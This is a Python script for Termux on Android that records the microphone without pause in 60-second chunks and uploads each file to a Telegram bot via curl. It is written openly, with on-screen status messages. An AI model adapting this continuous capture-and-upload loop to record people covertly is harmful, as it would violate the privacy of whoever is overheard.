import os
import time
import subprocess
import shutil

# =========================
# Telegram Configuration
# =========================
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"  # replace with your bot token
CHAT_ID = "YOUR_CHAT_ID"            # replace with your chat ID

# =========================
# Storage Folder
# =========================
sdcard_path = "/storage/emulated/0/MyAudio"
os.makedirs(sdcard_path, exist_ok=True)

# =========================
# Recording Parameters
# =========================
CHUNK_DURATION = 60  # seconds
PAUSE_DURATION = 1   # seconds between recordings
MIN_FILE_SIZE = 50_000  # minimum valid file size in bytes

# =========================
# Telegram Functions
# =========================
def send_message_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    subprocess.run(["curl", "-s", "-F", f"chat_id={CHAT_ID}", "-F", f"text={text}", url])

def send_audio_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendAudio"
    result = subprocess.run(["curl", "-s", "-F", f"chat_id={CHAT_ID}", "-F", f"audio=@{file_path}", url])
    if result.returncode == 0:
        print(f"✅ File sent: {file_path}")
    else:
        print(f"❌ Error sending file: {file_path}")

# =========================
# Check Free Space
# =========================
def check_free_space(path):
    total, used, free = shutil.disk_usage(path)
    return free

# =========================
# Wait Until File is Fully Written
# =========================
def wait_file_complete(file_path, timeout=5):
    last_size = -1
    stable_count = 0
    while stable_count < timeout*2:  # check every 0.5s
        if not os.path.exists(file_path):
            time.sleep(0.5)
            continue
        current_size = os.path.getsize(file_path)
        if current_size == last_size:
            stable_count += 1
        else:
            stable_count = 0
            last_size = current_size
        time.sleep(0.5)

# =========================
# Main Loop
# =========================
try:
    while True:
        # Check free space
        free_space = check_free_space(sdcard_path)
        if free_space < 10_000_000:  # ~10 MB minimum
            print("⚠️ Low storage, stopping recording.")
            break

        # Generate filename
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        m4a_file = os.path.join(sdcard_path, f"audio_{timestamp}.m4a")

        print(f"🎙️ Recording: {m4a_file} ({CHUNK_DURATION}s)")

        # Start recording
        process = subprocess.Popen(["termux-microphone-record", "-f", m4a_file, "-l", str(CHUNK_DURATION)])

        # Countdown with Telegram notification 10 seconds before end
        for i in range(CHUNK_DURATION, 0, -1):
            if i == 10:
                print("\n📨 10s left - Sending Telegram message: 'Sending recording...'")
                send_message_to_telegram("Sending recording...")

            print(f"⏳ Time remaining: {i}s", end="\r")
            time.sleep(1)

        process.wait()
        print(f"\n⏹️ Recording completed: {m4a_file}")

        # Wait until file is fully written
        wait_file_complete(m4a_file)
        filesize = os.path.getsize(m4a_file)

        if filesize >= MIN_FILE_SIZE:
            # Send file immediately via curl
            send_audio_to_telegram(m4a_file)
        else:
            print(f"⚠️ File too small ({filesize} bytes), not sent")

        # Pause before next recording
        print(f"⏳ Pausing {PAUSE_DURATION}s before next recording...\n")
        time.sleep(PAUSE_DURATION)

except KeyboardInterrupt:
    print("\n🛑 Recording manually stopped.") 
